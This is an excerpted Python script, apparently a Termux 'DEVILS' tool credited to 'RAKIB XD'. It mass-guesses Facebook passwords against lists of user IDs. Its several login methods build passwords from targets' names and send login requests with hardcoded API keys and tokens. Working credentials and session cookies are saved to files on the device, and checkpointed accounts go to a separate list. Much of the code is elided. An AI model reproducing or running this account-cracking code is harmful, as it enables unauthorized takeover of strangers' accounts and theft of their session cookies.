...
#########UA + VER ########
xgd=requests.get('https://raw.githubusercontent.com/mdtasin123/.v/main/.v').text.splitlines()
version1 = str(xgd)
version = "V3.3"
xo = requests.get('https://raw.githubusercontent.com/mdtasin123/vr/main/vr.txt').text.splitlines()
version1 = str(xo)
...
open('/sdcard/DEVILS-IDS/devil-ok.txt', 'a')
...
logo = """\033[1;37mm8888b. d88888b db    db d888888b db      .d8888. 
...
\033[1;37m════════════════════════════════════════════════
\033[1;32m  • \033[1;37m Tool Owner :-  RAKIB XD
\033[1;32m  • \033[1;37m GitHub     :-  RAKIB 404
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[DEVILS-M1] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
                ...
                if 'session_key' in q:
                    ...
                    oks.append(sid)
                    open('/sdcard/devils_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/devils_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [devils-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/devils_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    oks.append(sid)
                    open('/sdcard/DEVILS-M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DEVILS_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [DEVILS-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[DEVILS-M2] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{A} [devils-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/devils_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/devils_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
    ...
    def methodF(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[DEVILS-M6] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [devils-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/devils_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def methodE(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[DEVILS-M5] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[DEVILS-M4] {loop} OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
		...
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
			 ...
			 #print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
				...
				print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
				#print('\033[1;92m[DEVILS-OK] '+cid+'|'+ps+'|'+coki+'\033[1;32m')
				open('/sdcard/DEVILS-IDS/devil-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
				oks.append(uid)
				...
				cid = coki[82:97]
				#print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
				open('/sdcard/DEVILS-IDS/devil-cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(uid)
				break
			else:
				continue
